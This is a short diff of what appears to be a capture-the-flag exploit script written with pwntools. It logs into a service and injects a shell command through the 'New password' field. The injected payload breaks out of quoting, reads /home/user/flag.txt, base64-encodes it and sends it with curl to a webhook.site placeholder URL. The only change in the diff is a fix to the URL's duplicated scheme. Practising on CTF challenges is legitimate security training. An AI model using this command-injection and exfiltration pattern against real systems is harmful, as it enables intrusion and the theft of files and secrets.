@@ -144,7 +144,7 @@ io.sendlineafter("Password: ", "123456")
 
 io.sendlineafter("> ", "5") # Select change password option
 
-ATTACKER = "https://webhook.site/your_webhook_here"
+ATTACKER = "webhook.site/your_webhook_here"
 io.sendlineafter("New password: ", f'"; curl https://{ATTACKER}/$(cat /home/user/flag.txt | base64); echo "')
 
 io.close()
